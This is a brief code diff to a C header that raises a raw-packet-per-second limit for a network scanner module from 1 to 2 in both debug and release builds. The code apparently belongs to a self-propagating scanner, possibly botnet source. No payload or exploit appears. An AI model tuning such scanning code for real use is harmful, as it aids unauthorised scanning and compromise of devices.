@@ -6,10 +6,10 @@
 
 #ifdef DEBUG
 #define SCANNER_MAX_CONNS   1
-#define SCANNER_RAW_PPS     1
+#define SCANNER_RAW_PPS     2
 #else
 #define SCANNER_MAX_CONNS   1
-#define SCANNER_RAW_PPS     1
+#define SCANNER_RAW_PPS     2
 #endif
 
 #define SCANNER_RDBUF_SIZE  256
